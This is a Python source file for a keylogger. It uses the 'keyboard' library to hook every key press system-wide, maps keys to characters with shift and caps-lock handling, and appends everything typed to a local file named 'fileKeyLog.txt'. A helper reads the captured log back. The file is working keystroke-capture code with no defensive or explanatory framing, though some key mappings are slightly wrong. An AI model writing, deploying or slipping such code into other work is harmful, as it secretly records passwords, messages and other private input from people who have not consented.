import time
import keyboard

class appstart:
    path = "fileKeyLog.txt"
    caps = 0
    shift = 0

    @staticmethod
    def strLog():
        with open(appstart.path, "r") as file:
            return file.read()

class InterceptKeys:
    @staticmethod
    def startKLog():
        keyboard.hook(InterceptKeys.on_key)
        keyboard.wait()

    @staticmethod
    def on_key(event):
        if event.event_type == "down":
            vkCode = event.scan_code

            with open(appstart.path, "a") as file:
                if keyboard.is_pressed("shift"):
                    appstart.shift = 1

                if event.name == "space":
                    file.write(" ")
                elif event.name == "enter":
                    file.write("Enter\n")
                elif event.name == "backspace":
                    file.write("Backspace")
                elif event.name == "tab":
                    file.write("Tab")
                elif event.name == "0":
                    file.write("0" if appstart.shift == 0 else ")")
                elif event.name == "1":
                    file.write("1" if appstart.shift == 0 else "!")
                elif event.name == "2":
                    file.write("2" if appstart.shift == 0 else "@")
                elif event.name == "3":
                    file.write("3" if appstart.shift == 0 else "#")
                elif event.name == "4":
                    file.write("4" if appstart.shift == 0 else "$")
                elif event.name == "5":
                    file.write("5" if appstart.shift == 0 else "%")
                elif event.name == "6":
                    file.write("6" if appstart.shift == 0 else "^")
                elif event.name == "7":
                    file.write("7" if appstart.shift == 0 else "&")
                elif event.name == "8":
                    file.write("8" if appstart.shift == 0 else "*")
                elif event.name == "9":
                    file.write("9" if appstart.shift == 0 else "(")
                elif event.name in ["lshift", "rshift", "lctrl", "rctrl", "lalt", "ralt", "lwin", "rwin", "apps"]:
                    pass
                elif event.name == "/":
                    file.write("/" if appstart.shift == 0 else "?")
                elif event.name == "[":
                    file.write("[" if appstart.shift == 0 else "{")
                elif event.name == "]":
                    file.write("]" if appstart.shift == 0 else "}")
                elif event.name == ";":
                    file.write(";" if appstart.shift == 0 else ":")
                elif event.name == "'":
                    file.write("'" if appstart.shift == 0 else '"')
                elif event.name == ",":
                    file.write("," if appstart.shift == 0 else "<")
                elif event.name == ".":
                    file.write("." if appstart.shift == 0 else ">")
                elif event.name == "-":
                    file.write("-" if appstart.shift == 0 else "_")
                elif event.name == "=":
                    file.write("=" if appstart.shift == 0 else "+")
                elif event.name == "`":
                    file.write("`" if appstart.shift == 0 else "~")
                elif event.name == "\\":
                    file.write("|")
                elif event.name == "caps lock":
                    appstart.caps = 1 if appstart.caps == 0 else 0
                else:
                    if appstart.shift == 0 and appstart.caps == 0:
                        file.write(event.name.lower())
                    elif appstart.shift == 1 and appstart.caps == 0:
                        file.write(event.name.upper())
                    elif appstart.shift == 0 and appstart.caps == 1:
                        file.write(event.name.upper())
                    elif appstart.shift == 1 and appstart.caps == 1:
                        file.write(event.name.lower())

                appstart.shift = 0
